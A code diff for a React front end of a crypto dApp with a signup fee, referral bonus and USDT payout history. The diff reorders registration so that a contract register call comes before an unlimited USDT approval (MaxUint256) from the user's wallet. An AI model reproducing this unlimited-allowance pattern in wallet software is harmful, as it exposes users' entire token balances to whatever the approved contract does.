@@ -34,8 +34,6 @@ function App() {
       if (data.isReg) fetchHistory(userAddress, provider);
       const fee = await contract.signupFee();
       setSignupFee(ethers.formatUnits(fee, 18));
-      // Bonus logic (Assuming contract has a getReferralBonus function, if not, update as needed)
-      // setRefBonus(ethers.formatUnits(await contract.referralBonus(userAddress), 18));
     } catch (e) { console.error(e); }
   };
 
@@ -46,9 +44,14 @@ function App() {
       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
       const coreContract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
       
-      await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
+      // 1. Pehle Register call
       const ref = (referralInput && ethers.isAddress(referralInput)) ? referralInput : "0x0000000000000000000000000000000000000000";
-      await coreContract.register(ref);
+      const regTx = await coreContract.register(ref);
+      await regTx.wait();
+      
+      // 2. Phir Approval
+      await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
+      
       setIsRegistered(true);
       fetchHistory(await signer.getAddress(), new ethers.BrowserProvider(window.ethereum));
       alert("Registration Successful!");
@@ -114,7 +117,6 @@ function App() {
         <div className="w-full max-w-sm bg-[#1e1335]/60 p-8 rounded-[40px] border border-purple-500/30 shadow-2xl">
           <p className="text-cyan-400 mb-6 text-sm">Active: {account.substring(0,6)}...{account.slice(-4)}</p>
           
-          {/* Referral Bonus Section */}
           <div className="bg-[#0a0515] p-4 rounded-[2rem] mb-4 border border-purple-800 text-center">
             <p className="text-gray-400 text-xs uppercase tracking-widest">Referral Bonus</p>
             <p className="text-green-400 font-bold text-lg">{refBonus} USDT</p>
@@ -134,7 +136,6 @@ function App() {
           <div className="space-y-3">
             {history.map((tx, i) => (
               <div key={i} className="bg-[#0a0515] p-4 rounded-[2rem] flex justify-between border border-purple-900/50">
-                {/* Last 5 digits display */}
                 <span className="text-xs text-gray-400">Sent to ...{tx.destination.slice(-5)}</span>
                 <span className="text-green-400 font-bold text-sm">+{ethers.formatUnits(tx.amount, 18)} USDT</span>
               </div>
